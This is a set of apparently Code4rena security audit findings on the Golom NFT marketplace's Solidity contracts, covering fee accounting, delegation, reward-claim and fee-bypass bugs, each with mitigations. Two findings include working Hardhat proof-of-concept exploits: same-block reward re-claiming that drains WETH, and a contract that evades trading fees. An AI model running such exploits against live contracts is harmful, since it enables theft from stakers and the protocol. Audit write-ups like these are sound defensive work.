# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L98-L138   # Vulnerability details  ## Impact `RewardDistributor` will stop accumulating fees for staker rewards once `rewardToken` supply has reached the maximum supply (1 billion).  ## Vulnerability Details [RewardDistributor.sol#L98-L138](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L98-L138) ``` function addFee(address[2] memory addr, uint256 fee) public onlyTrader {     if (rewardToken.totalSupply() > 1000000000 * 10**18) {         // if supply is greater then a billion dont mint anything, dont add trades         return;     }          ...          feesTrader[addr[0]][epoch] = feesTrader[addr[0]][epoch] + fee;     feesExchange[addr[1]][epoch] = feesExchange[addr[1]][epoch] + fee;     epochTotalFee[epoch] = epochTotalFee[epoch] + fee; } ``` The check at the beginning of `addFee` is supposed to stop `RewardDistributor` from minting additional rewardToken once it has reached 1 billion supply. However, the current implementation has a side effect of causing the function to skip recording accumulated trading fees (the last 3 lines of the function). This will cause stakers to lose their trading fee rewards once the max supply has been reached, and the funds will be permanently locked in the contract.  ## Proof of Concept - Alice staked `GOLOM` to receive fee rewards from `RewardDistributor`. - `GOLOM` supply reaches 1 billion token. - Traders keep trading on `GolomTrader`, sending protocol fees to `RewardDistributor`. However, `RewardDistributor.addFee` does not update the fee accounting. - Alice won't receive any fee reward and protocol fees are stuck in the contract.  ## Recommended Mitigation Steps Modify `addFee` so that the check won't skip accruing trade fees: ``` function addFee(address[2] memory addr, uint256 fee) public onlyTrader {     if (block.timestamp > startTime + (epoch) * secsInDay) {         uint256 previousEpochFee = epochTotalFee[epoch];         epoch = epoch + 1;          if (rewardToken.totalSupply() > 1000000000 * 10**18) {             emit NewEpoch(epoch, 0, 0, previousEpochFee);         } else {             uint256 tokenToEmit = (dailyEmission * (rewardToken.totalSupply() - rewardToken.balanceOf(address(ve)))) /                 rewardToken.totalSupply();             uint256 stakerReward = (tokenToEmit * rewardToken.balanceOf(address(ve))) / rewardToken.totalSupply();              rewardStaker[epoch] = stakerReward;             rewardTrader[epoch] = ((tokenToEmit - stakerReward) * 67) / 100;             rewardExchange[epoch] = ((tokenToEmit - stakerReward) * 33) / 100;             rewardToken.mint(address(this), tokenToEmit);             epochBeginTime[epoch] = block.number;             if (previousEpochFee > 0) {                 if (epoch == 1){                     epochTotalFee[0] =  address(this).balance; // staking and trading rewards start at epoch 1, for epoch 0 all contract ETH balance is converted to staker rewards rewards.                     weth.deposit{value: address(this).balance}();                   }else{                     weth.deposit{value: previousEpochFee}();                 }             }             emit NewEpoch(epoch, tokenToEmit, stakerReward, previousEpochFee);         }     }     feesTrader[addr[0]][epoch] = feesTrader[addr[0]][epoch] + fee;     feesExchange[addr[1]][epoch] = feesExchange[addr[1]][epoch] + fee;     epochTotalFee[epoch] = epochTotalFee[epoch] + fee;     return; } ```
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L375-L400   # Vulnerability details  Currently `(o.totalAmt * 50) / 10000)` protocol fee share is multiplied by `amount` twice when being accounted for as a deduction from the total in amount due to the `msg.sender` taker calculations in _settleBalances(), which is called by fillBid() and fillCriteriaBid() to handle the payouts.  Setting the severity to be high as reduced payouts is a fund loss impact for taker, which receives less than it's due whenever `amount > 1`.  Notice that the amount lost to the taker is left on the contract balance and currently is subject to other vulnerabilities, i.e. can be easily stolen by an attacker that knowns these specifics and tracks contract state. When these issues be fixed this amount to be permanently frozen on the GolomTrader's balance as it's unaccounted for in all subsequent calculations (i.e. all the transfers are done with regard to the accounts recorded, this extra sum is unaccounted, there is no general native funds rescue function, so when all other mechanics be fixed the impact will be permanent freeze of the part of taker's funds).  ## Proof of Concept  _settleBalances() uses `(o.totalAmt - protocolfee - ...) * amount`, which is `o.totalAmt * amount - ((o.totalAmt * 50) / 10000) * amount * amount - ...`, counting protocol fee extra `amount - 1` times:  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L389-L399  ```solidity             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *                     amount -                     p.paymentAmt,                 msg.sender             );         } else {             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,                 msg.sender             ); ```  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L375-L400  ```solidity     function _settleBalances(         Order calldata o,         uint256 amount,         address referrer,         Payment calldata p     ) internal {         uint256 protocolfee = ((o.totalAmt * 50) / 10000) * amount;         WETH.transferFrom(o.signer, address(this), o.totalAmt * amount);         WETH.withdraw(o.totalAmt * amount);         payEther(protocolfee, address(distributor));         payEther(o.exchange.paymentAmt * amount, o.exchange.paymentAddress);         payEther(o.prePayment.paymentAmt * amount, o.prePayment.paymentAddress);         if (o.refererrAmt > 0 && referrer != address(0)) {             payEther(o.refererrAmt * amount, referrer);             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *                     amount -                     p.paymentAmt,                 msg.sender             );         } else {             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,                 msg.sender             );         } ```  Say, if `amount = 6`, while `((o.totalAmt * 50) / 10000) = 1 ETH`, `6 ETH` is total `protocolfee` and needs to be removed from `o.totalAmt * 6` to calculate taker's part, while `1 ETH * 6 * 6 = 36 ETH` is actually removed in the calculation, i.e. `36 - 6 = 30 ETH` of taker's funds will be frozen on the contract balance.  ## Recommended Mitigation Steps  Consider accounting for `amount` once, for example:  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L375-L403  ```solidity     function _settleBalances(         Order calldata o,         uint256 amount,         address referrer,         Payment calldata p     ) internal { -       uint256 protocolfee = ((o.totalAmt * 50) / 10000) * amount; +       uint256 protocolfee = ((o.totalAmt * 50) / 10000);         WETH.transferFrom(o.signer, address(this), o.totalAmt * amount);         WETH.withdraw(o.totalAmt * amount); -       payEther(protocolfee, address(distributor)); +       payEther(protocolfee * amount, address(distributor));         payEther(o.exchange.paymentAmt * amount, o.exchange.paymentAddress);         payEther(o.prePayment.paymentAmt * amount, o.prePayment.paymentAddress);         if (o.refererrAmt > 0 && referrer != address(0)) {             payEther(o.refererrAmt * amount, referrer);             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt - o.refererrAmt) *                     amount -                     p.paymentAmt,                 msg.sender             );         } else {             payEther(                 (o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt,                 msg.sender             );         }         payEther(p.paymentAmt, p.paymentAddress); -       distributor.addFee([msg.sender, o.exchange.paymentAddress], protocolfee); +       distributor.addFee([msg.sender, o.exchange.paymentAddress], protocolfee * amount);     } ```  
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L14-L73   # Vulnerability details  ## Impact Potential downtime in GolomTrader  ## Proof of Concept GolomToken.sol doesn't have a function to mint the treasury tokens as specified in the docs (https://docs.golom.io/tokenomics-and-airdrop). In order for these tokens to be minted, the minter would have to be changed via setMinter() and executeSetMinter() to a contract that can mint the treasury tokens. Because of the 24 hour timelock, this would lead to downtime for GolomTrader.sol if trading has already begun. This is because GolomTrader.sol calls RewardDistributor.sol#addFees each time there is a filled order. When the epoch changes, RewardDistributor.sol will try to call the mint function in GolomToken.sol. Because of the timelock, there will be at least a 24 hours period where RewardDistributor.sol is not the minter and doesn't have the permission to mint. This means that during that period all trades will revert.  ## Tools Used  ## Recommended Mitigation Steps Add a function to GolomToken.sol to mint the treasury tokens similar to the mintAirdrop() and mintGenesisReward() functions.
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/8f198624b97addbbe9602a451c908ea51bd3357c/contracts/vote-escrow/VoteEscrowDelegation.sol#L80   # Vulnerability details  ## Impact In `delegate`, when a user delegates to a new tokenId, the tokenId is not removed from the current delegatee. Therefore, one user can easily multiply his voting power, which makes the toking useless for voting / governance decisions.  ## Proof Of Concept Bob owns the token with ID 1 with a current balance of 1000. He also owns tokens 2, 3, 4, 5. Therefore, he calls `delegate(1, 2)`, `delegate(1, 3)`, `delegate(1, 4)`, `delegate(1, 5)`. Now, if there is a governance decision and `getVotes` is called, Bobs balance of 1000 is included in token 2, 3, 4, and 5. Therefore, he quadrupled the voting power of token 1.  ## Recommended Mitigation Steps Remove the entry in `delegatedTokenIds` of the old delegatee or simply call `removeDelegation` first.  
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L172-L210 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L185   # Vulnerability details  ## Impact A malicious user can repeatedly claim the same staker reward for an epoch, provided the transactions all happen in the same block. This can effectively be done using services like [Flashbots bundles](https://docs.flashbots.net/Flashbots-auction/searchers/faq/#can-you-give-a-step-by-step-description-of-how-flashbots-works-for-a-searcher-today) and will result in the draining of the WETH balance of the `RewardDistributor` contract.  The idea is to bypass the require statement [line 185](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L185) which checks if a claim has been already done for the epoch, **for a specific token ID**. By moving the locked tokens in a new lock, a new token ID will be generated and can be used to claim the rewards again, **if the transaction happens in the same block for which the epoch is updated**.  Indeed, when `multiStakerClaim()` is called, the `rewardETH` will be calculated from the amount of tokens locked in `tokenids[tindex]` at the block that triggered the epoch change (variable `epochBeginTime`). If, during this time, an attacker transfers its staked tokens to a new vault using the [`merge`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893) function of the VE token, the function will calculate the amount of staked tokens for the newly created tokenID **as the same as the original tokenID reward**.  A example abuse will look like this (pseudo-code adapted from the PoC) : ```javascript lockID = voteEscrow.create_lock(amount, 1 week); // Create lock #1 before // IN THE BLOCK OF EPOCH CHANGE rewardDistributor.multiStakerClaim([lockId], [0]); // Claim epoch 0 rewards for lock #1 voteEscrow.create_lock(1, 1 week); // Create lock #2 (requires 1 Golom token, could be created in advance) voteEscrow.merge(lockId, lockId + 1); // Transfer lock #1 tokens to lock #2 rewardDistributor.multiStakerClaim([lockId + 1], [0]); // Claim same epoch rewards for lock #2 // repeat ... ```  To abuse this, the attacker needs to follow this steps: - Have some locked Golom tokens. - Wait for a `addFee` call that will trigger an epoch change (this can be monitored by looking at the mempool or predicted from block timestamps). Services like Flashbots also [allows for specifying a range of blocks for bundles](https://docs.flashbots.net/Flashbots-auction/searchers/faq/#how-do-i-target-a-timestamp-range-instead-of-a-block-number-when-submitting-a-bundle) for better targeting. - Send a bundle of transactions to be included with the block containing the epoch changing transaction (see the PoC for an example of transactions).  Note that this needs to succeed only once to allow an attacker to drain all WETH funds so if the bundle isn't included for a particular epoch, given the frequency of epoch changes, the bundle will eventually be included and trigger the exploit.  ## Proof of Concept Hardhat config for disabling auto-mine and control transactions included in blocks: ```json hardhat: {     allowUnlimitedContractSize: true,     gas: 12000000,     blockGasLimit: 0x1fffffffffffff,     mining: {       auto: false,       interval: 10     } }, ``` Hardhat test (requires setting up VoteEscrow): ```javascript it('[#2] Repeated calls to `multiStakerClaim` in the same block leads to loss of funds', async () => {     async function advance_time(time_s:any){         let timestamp = await getTimestamp();         await ethers.provider.send('evm_mine', [timestamp + time_s]);     }      async function mine(){         await ethers.provider.send('evm_mine', []);     }      async function send_order(){         await testErc721.mint(await maker.getAddress());          let exchangeAmount = ethers.utils.parseEther('1'); // cut for the exchanges         let prePaymentAmt = ethers.utils.parseEther('0.25'); // royalty cut         let totalAmt = ethers.utils.parseEther('10');         let tokenId = await testErc721.current();          const order = {             collection: testErc721.address,             tokenId: tokenId,             signer: await maker.getAddress(),             orderType: 0,             totalAmt: totalAmt,             exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },             prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },             isERC721: true,             tokenAmt: 1,             refererrAmt: 0,             root: '0x0000000000000000000000000000000000000000000000000000000000000000',             reservedAddress: constants.AddressZero,             nonce: 0,             deadline: Date.now() + 100000000,             r: '',             s: '',             v: 0,         };          let signature = (await maker._signTypedData(domain, types, order)).substring(2);          order.r = '0x' + signature.substring(0, 64);         order.s = '0x' + signature.substring(64, 128);         order.v = parseInt(signature.substring(128, 130), 16);          return golomTrader.connect(prepay).fillAsk(             order,              1,              constants.AddressZero,              {paymentAmt: prePaymentAmt, paymentAddress: await governance.getAddress()},              constants.AddressZero,              {value: utils.parseEther('10.25')}         );     }      async function showPendingBlock(){         console.log('[PENDING]\n', await ethers.provider.send("eth_getBlockByNumber", ["pending", false]));     }      // Get some Golom tokens to taker, could come from anywhere     await golomToken.connect(governance).mintAirdrop(await taker.getAddress());     // Approve spending from VE     await golomToken.connect(taker).approve(voteEscrow.address, constants.MaxUint256);      // Simulate more fees by putting some ETH in contract before epoch 0     await maker.sendTransaction({to: rewardDistributor.address, value: utils.parseEther('100')});      // Taker starts with 10_000 ETH, hardhat account     let takerStartBalance = await ethers.provider.getBalance(taker.address);     // Send order for first epoch to get some fees in 'epochTotalFee'     await send_order();     await mine();     advance_time(1659211200 + 24*60*60 + 1); // Fast forward to epoch 1          // Setup some users who locks their tokens in VE beforehand     let lockId = 0;     for (let i = 0; i < 5; ++i){         let user = accounts[6+i];         await golomToken.connect(taker).transfer(await user.getAddress(), utils.parseEther('1'));         await golomToken.connect(user).approve(voteEscrow.address, constants.MaxUint256);         await voteEscrow.connect(user).create_lock(utils.parseEther('1'), 7*24*60*60, {gasLimit: 100000000});         lockId += 1;     }      // Create lock for taker with 1 ETH equivalent in Golom tokens (could work with only 1 'Wei' token although it will require lots of transactions)     await voteEscrow.connect(taker).create_lock(utils.parseEther('1'), 24*60*60*7, {gasLimit: 100000000});     lockId += 1;     await send_order(); // Trigger epoch change      // --- IN THE SAME BLOCK ---     await rewardDistributor.multiStakerClaim([lockId], [0]); // Claim epoch rewards for lock #1     await voteEscrow.connect(taker).create_lock(1, 24*60*60*7, {gasLimit: 100000000}); // Create lock #2 (requires 1 Golom token)     await voteEscrow.connect(taker).merge(lockId, lockId + 1, {gasLimit: 100000000}); // Merge lock #1 tokens to lock #2     await rewardDistributor.multiStakerClaim([lockId + 1], [0]); // Claim same epoch rewards for lock #2     // ... Repeat as much as you want ;)     // --- IN THE SAME BLOCK ---     await mine();      console.log('Taker WETH balance:', utils.formatEther(await weth.balanceOf(taker.address)));     await weth.connect(taker).withdraw(await weth.balanceOf(taker.address)); // Could be the last transaction in the block too     await mine();      // Taker balance difference is +++ at the end      let takerEndBalance = (await ethers.provider.getBalance(taker.address)).sub(takerStartBalance);     console.log('Taker ETH balance:', utils.formatEther(await ethers.provider.getBalance(taker.address)), '/ end:', utils.formatEther(takerEndBalance)); }); ``` Sample output: ```console RewardDistributor.sol                                                                                                                                                   Exploits                                                                                                                                                          [SOL] 27 0 50000000000000000 // First addFee call for adding fees  [SOL] 38 0 50000000000000000 // Second addFee triggering epoch change [WETH] Deposit 100100000000000000000 // Epoch 0 WETH deposit [SOL_EPOCH] 1 599999983058823529411764 16941175992249134 50000000000000000 // epoch, tokenToEmit, stakerReward, previousEpochFee 16941175992249134 401999977298823849898962 197999988818823687263667 38 // rewardStaker[epoch], rewardTrader[epoch], rewardExchange[epoch], epochBeginTime[epoch]  0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance before: 0 // WETH balance of taker [CLAIM] 6 38 911822995832895 // First multiStakerClaim, (tokenID, epochBeginTime, balanceOfAtNFT) [WETH] Sent 16683333333333333333 to 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance after: 16683333333333333333 // WETH balance of taker  0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance before: 16683333333333333333 // WETH balance of taker [CLAIM] 7 38 911822995832895 // Second multiStakerClaim, (tokenID, epochBeginTime, balanceOfAtNFT) [WETH] Sent 16683333333333333333 to 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 0x70997970c51812dc3a010c7d01b50e0d17dc79c8 balance after: 33366666666666666666 // WETH balance of taker  Taker WETH balance: 33.366666666666666666 // After block is mined Taker ETH balance: 10033.36524137856006494 / end: 33.365289929424174404 // Profit !!       √ [#2] Repeated calls to `multiStakerClaim` in the same block leads to loss of funds ``` ## Recommended Mitigation Steps I initially thought about a few possible solutions: - Checking a lock creation time to prevent claiming from locks created in the same block **but the attacker can just create the blocks beforehand.** - Tracking the `msg.sender` or `tx.origin` for preventing multiple calls to `multiStakerClaim` in the same block **but the attacker can just send transactions from different addresses.** - Preventing the merging of locks **but the attacker can just create locks in advance and withdraw/add funds continuously between old/new locks.**   None really fixes the vulnerability as it comes from the feature of **locks being tradable** meaning it's not practically feasable to know if a lock has already be claimed by an individual **just by looking at the lock ID**.  A possible solution would be to find a way to prevent multiple calls to the same function within a block or better, make a checkpoint of the locks balances for each `epochBeginTime` and uses these values for calculating the rewards (instead of querying the VE contract in the loop).  
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L172-L210   # Vulnerability details  ## Impact Rewards owed burned NFT are permanently locked  ## Proof of Concept     function _burn(uint256 _tokenId) internal {         require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');          address owner = ownerOf(_tokenId);          // Clear approval         approve(address(0), _tokenId);         // Remove token         _removeTokenFrom(msg.sender, _tokenId);         emit Transfer(owner, address(0), _tokenId);     }      function _removeTokenFrom(address _from, uint256 _tokenId) internal {         // Throws if `_from` is not the current owner         assert(idToOwner[_tokenId] == _from);         // Change the owner         idToOwner[_tokenId] = address(0);         // Update owner token index tracking         _removeTokenFromOwnerList(_from, _tokenId);         // Change count tracking         ownerToNFTokenCount[_from] -= 1;     }  After an NFT is burned, owner of token is set to address(0).          rewardToken.transfer(tokenowner, reward);  This causes issues in multiStakerClaim L208. GOLOM uses OZ's implementation of ERC20 which doesn't allow tokens to be sent to address(0). Because the "owner" of the burned NFT is address(0) multiStakerClaim will always revert when called for a burned NFT trapping rewards in contract forever.  ## Tools Used  ## Recommended Mitigation Steps Implement a clawback clause inside the multiStakerClaim function. If the token is burned (i.e. owned by address(0)) the rewards should be transferred to different address. These rewards could be claimed to the treasury or burned, etc.           if (tokenowner == address(0){             rewardToken.transfer(treasury, reward);             weth.transfer(treasury, rewardEth);         }  
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L79 https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L213   # Vulnerability details  The contract is accidently editing both the previous and current checkpoint when changing/removing a delegate.  ## Impact Incorrect counting of votes.  ## Proof of Concept If in `delegate` the delegate already has checkpoints, the function will grab the latest checkpoint, and add the `tokenId` to it. Note that it changes the storage variable. ```solidity         if (nCheckpoints > 0) {             Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];             checkpoint.delegatedTokenIds.push(tokenId);             _writeCheckpoint(toTokenId, nCheckpoints, checkpoint.delegatedTokenIds); ``` It then calls `_writeCheckpoint`, which [will add](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L106) a new checkpoint if there's no checkpoint created for this block yet: ```solidity         Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];          if (nCheckpoints > 0 && oldCheckpoint.fromBlock == block.number) {             oldCheckpoint.delegatedTokenIds = _delegatedTokenIds;         } else {             checkpoints[toTokenId][nCheckpoints] = Checkpoint(block.number, _delegatedTokenIds);             numCheckpoints[toTokenId] = nCheckpoints + 1;         } ``` Therefore, if this function has created a new checkpoint with the passed `_delegatedTokenIds`, we already saw that the previous function has already added `tokenId` to the previous checkpoint, so now both the new checkpoint and the previous checkpoint will have `tokenId` in them. This is wrong as it updates an earlier checkpoint with the latest change.  The same situation happens in [`removeDelegation`](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L213).  ## Recommended Mitigation Steps When reading the latest checkpoint: ```solidity Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1]; ``` Change the `storage` to `memory`. This way it will not affect the previous checkpoint, but will pass the correct updated array to `_writeCheckpoint`, which will then write/update the correct checkpoint.  
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L217   # Vulnerability details  ## Impact  It is possible to send a higher `msg.value` than is required to `fillAsk()`. The excess value that is sent will be permanently locked in the contract.  ## Proof of Concept  There is only one check over `msg.value` and it is that it's greater than `o.totalAmt * amount + p.paymentAmt`. As seen in the following code snippet from #217. ```solidity         require(msg.value >= o.totalAmt * amount + p.paymentAmt, 'mgmtm'); ```  The issue here is that the contract will only ever spend exactly `o.totalAmt * amount + p.paymentAmt`. Hence if `msg.value` is greater than this then the excess value will be permanently locked in the contract.  ## Recommended Mitigation Steps  To avoid this issue consider enforcing a strict equality.   ```solidity         require(msg.value == o.totalAmt * amount + p.paymentAmt, 'mgmtm'); ```  
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1226-L1236   # Vulnerability details  ## Impact Burn NFTs remained delegated causing bloat and wasting gas  ## Proof of Concept VoteEscrowDelegation.sol doesn't change the withdraw or _burn functions inherited from VoteEscrowCore.sol. These functions are ignorant of the delegation system and don't properly remove the delegation when burning an NFT. The votes for the burned NFT will be removed but the reference will still be stored in the delegation list where it was last delegated. This creates a few issues. 1) It adds bloat to both getVotes and getPriorVotes because it adds a useless element that must be looped through. 2) The max number of users that can delegate to another NFT is 500 and the burned NFT takes up one of those spots reducing the number of real users that can delegate. 3) Adds gas cost when calling removeDelegation which adds gas cost to _transferFrom because removeElement has to cycle through a larger number of elements.  ## Tools Used  ## Recommended Mitigation Steps Override _burn in VoteEscrowDelegation and add this.removeDelegation(_tokenId), similar to how it was done in _transferFrom  
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L203-L271   # Vulnerability details  ## Impact - Users can avoid paying fees while trading trustlessly & using golom's network effects ## Description - If a maker makes below mentioned `AvoidsFeesContract` a [reservedAddress](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L220) and hides the info about how much they want their NFT in [order.root](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L58), they can avoid paying fees while trading trustlessly and using the nework effects of golom maketplace with 0 [o.totalAmt](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L52). see POC to get a better idea. - Here the maker uses order.root to hide the amount they want to get paid because it is much cleaner for a POC.     - but since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.      - Reason they would use deadline is because that is something they can control in the golom NFT frontend      - They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check in the contract would look a different ## Proof of Concept - clone the [repo](https://github.com/code-423n4/2022-07-golom) and run `yarn` - create a `AvoidsFeesContract.sol` contract in `contracts/test/` folder with following code ``` //contract that avoids paying fees everytime  pragma solidity 0.8.11;  import "../core/GolomTrader.sol";  //A maker will be gurranteed a payout if it makes this contract the reservedAddress and hide the payment info about how much they want in Oder.root //Users will use this every time to trade to avoid paying fees //They use the networking effects of the golom marketplace without paying the fees contract AvoidsFeesContract {     GolomTrader public immutable golomTrader;      constructor(GolomTrader _golomTrader) {         golomTrader = _golomTrader;     }      function fillAsk(         GolomTrader.Order calldata o,         uint256 amount,         address referrer,         GolomTrader.Payment calldata p,         address receiver     ) public payable {         require(             o.reservedAddress == address(this),             "not allowed if signer has not reserved this contract"         ); //the signer will only allow this contract to execute the trade and since it has following checks, they will be guranteed a payout they want without paying the fees         require(             p.paymentAddress == o.signer,             "signer needs to be the payment address"         );         //I am using root as an example because it is much cleaner for a POC.         //but since golom does not have an API where user can submit a signature without using the frontend, they will use something like deadline to hide the amount they want to get paid.         //Reason they would use deadline is because that is something they can control in the golom NFT frontend         //They can pack the information about deadline and amount they want to get paid, in one uint256 as a deadline and then the check below would look a little different         require(             p.paymentAmt == uint256(o.root),             "you need to pay what signer wants"         ); //the maker will hide the payment info in oder.root          golomTrader.fillAsk{value: msg.value}(             o,             amount,             referrer,             p,             receiver = msg.sender         );     } }  ``` - add following test in `test/GolomTrader.specs.ts` [here](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L390). - Also, add `const AvoidsFeesContractArtifacts = ethers.getContractFactory('AvoidsFeesContract');` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L14) line and `import { AvoidsFeesContract as AvoidsFeesContractTypes } from '../typechain/AvoidsFeesContract';` after [this](https://github.com/code-423n4/2022-07-golom/blob/main/test/GolomTrader.specs.ts#L28) line. - run `npx hardhat compile && npx hardhat test` ```        it.only('should allow malicious contract to execute the trade while bypassing the fees', async () => {             //deploy the malicious contract             const avoidsFeesContract: AvoidsFeesContractTypes = (await (await AvoidsFeesContractArtifacts).deploy(golomTrader.address)) as AvoidsFeesContractTypes;              //here the frontend calculates exchangeAmount and prePaymentAmt as a percentage of how much the make wants to receive for their NFT.              //as far as the frontend is concerned, the maker inputs 0 for their NFT value which in turn makes the exchangeAmount and prePaymentAmt 0              let exchangeAmount = ethers.utils.parseEther('0'); // nothing to the exchange             let prePaymentAmt = ethers.utils.parseEther('0'); // no royalty cut             let totalAmt = ethers.utils.parseEther('0');             let tokenId = await testErc721.current();              let nftValueThatMakerWants = ethers.utils.parseEther('10.25');              const order = {                 collection: testErc721.address,                 tokenId: tokenId,                 signer: await maker.getAddress(),                 orderType: 0,                 totalAmt: totalAmt,                 exchange: { paymentAmt: exchangeAmount, paymentAddress: await exchange.getAddress() },                 prePayment: { paymentAmt: prePaymentAmt, paymentAddress: await prepay.getAddress() },                 isERC721: true,                 tokenAmt: 1,                 refererrAmt: 0,                 root: ethers.utils.hexZeroPad(nftValueThatMakerWants.toHexString(), 32), //convert Bignumber to bytes32                 reservedAddress: avoidsFeesContract.address,                 nonce: 0,                 deadline: Date.now() + 100000,                 r: '',                 s: '',                 v: 0,             };              let signature = (await maker._signTypedData(domain, types, order)).substring(2); //a valid signature as far as your frontend goes              order.r = '0x' + signature.substring(0, 64);             order.s = '0x' + signature.substring(64, 128);             order.v = parseInt(signature.substring(128, 130), 16);              let makerBalanceBefore = await ethers.provider.getBalance(await maker.getAddress());              await avoidsFeesContract.connect(taker).fillAsk(                 order,                 1,                 '0x0000000000000000000000000000000000000000',                 {                     paymentAmt: nftValueThatMakerWants,                     paymentAddress: order.signer,                 },                 receiver,                 {                     value: nftValueThatMakerWants,                 }             );              let makerBalanceAfter = await ethers.provider.getBalance(await maker.getAddress());              expect(await testErc721.balanceOf(await taker.getAddress())).to.be.equals('1');             expect(makerBalanceAfter.sub(makerBalanceBefore)).to.be.equals(nftValueThatMakerWants);//maker is guaranteed a payout          });  ```  ## Tools Used - the [repo](https://github.com/code-423n4/2022-07-golom) itself. (hardhat)  ## Recommended Mitigation Steps - make sure that o.totalAmt is greater than p.paymentAmt in addition to [this](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L217) check  
